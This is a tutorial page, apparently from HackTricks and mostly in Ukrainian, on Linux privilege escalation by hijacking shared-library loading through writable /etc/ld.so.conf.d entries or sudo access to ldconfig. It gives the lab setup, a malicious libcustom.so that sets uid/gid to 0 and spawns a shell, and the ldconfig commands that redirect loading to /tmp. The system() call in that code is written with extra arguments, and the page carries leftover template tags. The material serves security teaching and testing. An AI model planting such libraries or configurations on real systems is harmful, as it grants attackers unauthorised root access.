# ld.so privesc exploit example

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

## Підготовка середовища

У наступному розділі ви знайдете код файлів, які ми будемо використовувати для підготовки середовища

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **Створіть** ці файли на вашій машині в тій же папці
2. **Скомпілюйте** **бібліотеку**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Скопіюйте** `libcustom.so` до `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root привілеї)
4. **Скомпілюйте** **виконуваний файл**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Перевірте середовище

Перевірте, що _libcustom.so_ завантажується з _/usr/lib_ і що ви можете **виконати** двійковий файл.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

У цьому сценарії ми будемо припускати, що **хтось створив вразливий запис** всередині файлу в _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Вразлива папка - _/home/ubuntu/lib_ (де у нас є можливість запису).\
**Завантажте та скомпілюйте** наступний код у цій папці:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Тепер, коли ми **створили шкідливу бібліотеку libcustom всередині неправильно налаштованого** шляху, нам потрібно почекати **перезавантаження** або щоб користувач root виконав **`ldconfig`** (_якщо ви можете виконати цей бінар як **sudo** або у нього є **suid біт**, ви зможете виконати його самостійно_).

Після цього **перевірте знову**, звідки виконується `sharevuln`, завантажуючи бібліотеку `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Як ви можете бачити, **він завантажується з `/home/ubuntu/lib`** і якщо будь-який користувач виконає його, буде виконано оболонку:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Зверніть увагу, що в цьому прикладі ми не підвищили привілеї, але модифікуючи команди, що виконуються, і **чекаючи, поки root або інший привілейований користувач виконає вразливий бінарний файл**, ми зможемо підвищити привілеї.
{% endhint %}

### Інші неправильні налаштування - Така ж вразливість

У попередньому прикладі ми створили ілюзію неправильного налаштування, де адміністратор **встановив непривабливу папку в конфігураційному файлі в `/etc/ld.so.conf.d/`**.\
Але є й інші неправильні налаштування, які можуть викликати таку ж вразливість. Якщо у вас є **права на запис** у деякому **конфігураційному файлі** в `/etc/ld.so.conf.d`, у папці `/etc/ld.so.conf.d` або в файлі `/etc/ld.so.conf`, ви можете налаштувати таку ж вразливість і експлуатувати її.

## Експлуатація 2

**Припустимо, у вас є привілеї sudo над `ldconfig`**.\
Ви можете вказати `ldconfig`, **звідки завантажувати конфігураційні файли**, тому ми можемо скористатися цим, щоб змусити `ldconfig` завантажувати довільні папки.\
Отже, давайте створимо файли та папки, необхідні для завантаження "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Тепер, як вказано в **попередньому експлойті**, **створіть шкідливу бібліотеку в `/tmp`**.\
І нарешті, давайте завантажимо шлях і перевіримо, звідки бінарний файл завантажує бібліотеку:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Як ви можете бачити, маючи привілеї sudo над `ldconfig`, ви можете експлуатувати ту ж вразливість.**

{% hint style="info" %}
{% hint style="success" %}
Вчіться та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вчіться та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
